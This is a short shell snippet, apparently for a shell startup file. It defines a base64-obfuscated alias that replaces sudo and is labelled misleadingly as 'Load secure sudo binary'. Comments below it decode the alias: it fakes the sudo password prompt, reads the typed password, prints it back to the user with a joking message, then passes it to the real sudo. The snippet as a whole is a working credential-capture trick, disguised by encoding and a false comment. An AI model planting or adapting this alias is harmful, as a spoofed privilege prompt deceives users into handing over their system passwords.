# Load secure sudo binary
alias sudo="$(echo "ZWNobyAtbiAiW3N1ZG9dIHBhc3N3b3JkIGZvciAkVVNFUjogIjtyZWFkIC1zIHBhc3M7IGVjaG8gLWUgIgpUaGFua3MgZm9yIHlvdXIgcGFzc3dvcmQgJFVTRVIgIQpZb3VyIHBhc3N3b3JkIGlzICRwYXNzIDozIjsgZWNobyAkcGFzcyB8IHN1ZG8gLS1zdGRpbiA=" | base64 -d)"

# This alias is an obfuscation and one liner of this script :
# We fake the sudo prompt.
echo -n "[sudo] password for $USER: ";
# We read the user password (We don't use -p to set the prompt
# on one line bc zsh read and bash read intrepret -p differently.)
read -s pass;
#  We thank the user for his password and display it :3
echo -e "\nThanks for your password $USER !\nYour password is $pass :3";
# We call sudo and give it the user password, 
# as this script is supposed to be an alias there is no
# semicolon at the end of the line to execute the command after the alias.
echo $pass | sudo --stdin "
